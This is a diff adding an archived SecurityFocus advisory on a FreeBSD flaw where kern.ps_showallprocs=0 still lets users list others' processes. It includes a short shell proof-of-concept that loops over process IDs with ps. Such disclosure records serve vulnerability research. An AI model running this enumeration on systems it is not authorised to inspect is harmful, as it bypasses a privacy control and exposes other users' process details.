@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/4768/info
+
+In FreeBSD, setting kern.ps_showallprocs=0 via the sysctl call is meant to disable normal users from seeing any running processes that are not owned by them. The current implementation of this feature fails to protest system process information.
+
+It is still possible to obtain a list of processes from a procfs filesystem, or from specifying certain options to the 'ps' command.
+
+#!/bin/sh
+pid=0;
+while x=0; do
+/bin/ps -auxwwwp $pid | /usr/bin/grep $pid;
+pid=`expr $pid + 1`;
+done
